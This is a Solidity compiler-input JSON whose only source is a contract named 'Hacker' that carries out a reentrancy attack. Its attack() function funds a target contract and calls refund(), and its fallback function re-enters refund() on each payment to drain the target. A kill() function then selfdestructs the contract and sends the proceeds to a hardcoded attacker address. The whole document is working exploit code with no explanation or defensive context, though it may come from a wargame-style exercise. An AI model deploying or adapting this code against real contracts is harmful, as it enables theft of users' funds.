{"language":"Solidity","settings":{"libraries":{},"metadata":{"useLiteralContent":true},"optimizer":{"enabled":true,"runs":200},"remappings":[],"outputSelection":{"*":{"*":["*"],"":["*"]}}},"sources":{"contracts/Hacker.sol":{"content":"// SPDX-License-Identifier: MIT\r\npragma solidity >=0.6.0 <0.9.0;\r\n\r\ninterface Reentrance {\r\n    function receiveEther() external returns(bool);\r\n    function refund() external;\r\n\r\n}\r\n\r\ncontract Hacker {\r\n  address payable public hacker;\r\n\r\n  Reentrance targetContract;\r\n\r\n  event Start(address indexed _target, uint256 _balance);\r\n  event Stop(address indexed _target, uint256 _balance);\r\n  event Reenter(address indexed _target, uint256 _balance);\r\n\r\n  modifier onlyHacker {\r\n    require(msg.sender == hacker, \"caller is not the hacker\");\r\n    _;\r\n  }\r\n\r\n  constructor() public {\r\n    address addr = 0x36DbeFF531486155e8182044b660d76EFd11C47E;\r\n    hacker = payable(addr);\r\n  }\r\n\r\n  function attack(address _target) public payable onlyHacker {\r\n    require(msg.value > 0, \"Not enough ether to attack\");\r\n    targetContract = Reentrance(payable(_target));\r\n    _target.call{value: msg.value}(\"\");\r\n    emit Start(_target, address(this).balance);\r\n    targetContract.refund();\r\n  }\r\n\r\n  fallback() external payable {\r\n    emit Reenter(address(targetContract), address(this).balance);\r\n    targetContract.refund();\r\n  }\r\n\r\n  function kill() external onlyHacker {\r\n    selfdestruct(hacker);\r\n  }\r\n}"}}}